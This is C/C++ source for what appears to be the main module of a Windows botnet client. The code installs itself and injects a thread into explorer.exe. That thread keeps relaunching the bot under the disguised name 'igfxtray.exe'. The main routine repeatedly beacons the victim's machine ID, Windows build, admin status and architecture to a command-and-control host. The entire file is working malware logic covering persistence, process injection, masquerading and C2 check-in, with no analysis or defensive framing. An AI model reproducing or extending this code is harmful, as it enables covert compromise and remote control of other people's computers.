#include <Windows.h>
#include <Shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

#include "CommandHandler.h"
#include "InstallUtil.h"
#include "Config.h"
#include "Inject.h"
#include "Sysinfo.h"
#include "Utils.h"

WCHAR TempFilePath[ MAX_PATH ];

DWORD WINAPI InjectedThread( LPVOID lpZero )
{
		SetErrorMode(			  0x0001 | 
							 	  0x0002 |
								  0x0004 |
								  0x8000 );
		HANDLE s_hHandle = CreateMutexW ( 0, true, L"POIUYTREWQQWERTYUIOP" );

		 if ( GetLastError ( ) == ERROR_ALREADY_EXISTS ) { 
				CloseHandle ( s_hHandle );	
				 ExitProcess(0);					//close app becuz we already exists
		 }
		 WCHAR botname[] = {'i','g','f','x','t','r','a','y','.','e','x','e', 0};
		 WCHAR winNT[] = {'\\','\\','W','i','n','d','o','w','s',' ','N','T','\\','\\', 0};
		 WCHAR botloc[260]; //bot location (destination)
		 wsprintfW ( botloc, L"%s%s%s", GetShellFoldersKey(3), winNT, botname ); //ProgFiles
		 if(!PathFileExistsW(botloc)) //if we dont exists
		 {
			WCHAR ms[] = {'\\','\\','M','i','c','r','o','s','o','f','t','\\','\\', 0};
			wsprintfW ( botloc, L"%s%s%s", GetShellFoldersKey(2), ms, botname ); //all %appdata%
		 }
		 while(true)
		 {
			STARTUPINFOW si; 
			PROCESS_INFORMATION pi; 
			memset(&si, 0, sizeof(si)); 
			memset(&pi, 0, sizeof(pi)); 
			si.cb = sizeof(si);
			CreateProcessW(botloc, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
			Sleep(1000);
		 }
	ExitProcess(0);
}

int CALLBACK WinMain(
  _In_  HINSTANCE hInstance,
  _In_  HINSTANCE hPrevInstance,
  _In_  LPSTR lpCmdLine,
  _In_  int nCmdShow
)
{
		SetErrorMode(			  0x0001 | 
							 	  0x0002 |
								  0x0004 |
								  0x8000 );
		HANDLE s_hHandle = CreateMutexW ( 0, true, botMutex );

		 if ( GetLastError ( ) == ERROR_ALREADY_EXISTS ) { 
				CloseHandle ( s_hHandle );	
				ExitProcess(0);
		 }
		 //install
		 GetModuleFileNameW ( GetModuleHandleW ( NULL ), TempFilePath, sizeof ( TempFilePath ) ); //grabs current location of process
		 copybot(TempFilePath);
		 //inject
		 if( IsWow64Process() )
		 {
			JmpToExplorerX64(InjectedThread);
		 } else
		 {
			 if(!JmpToExplorer(InjectedThread))
			 {
				 InjectIntoExplorer(InjectedThread);
			 }
		 }
		 //webhandler
		 WCHAR *priv;
		 WCHAR *arch;
		 WCHAR data[1024];
		 if(IsWow64Process())
		 {
			 arch = L"1";
		 } else
		 {
			 arch = L"0";
		 }
		 if(HasAdminPrivileges())
		 {
			 priv = L"1";
		 } else
		 {
			 priv = L"0";
		 }
		 wsprintfW(data, L"uid=%s&bid=1&pfm=%s&prv=%s&arc=%s", MachineID(), WindowsBuild(), priv, arch);
		 while(true)
		 {
			 Web::CommandHandler(host, path, ToAnsi(data));
			 Sleep(60000 * kockout_limit);
		 }
}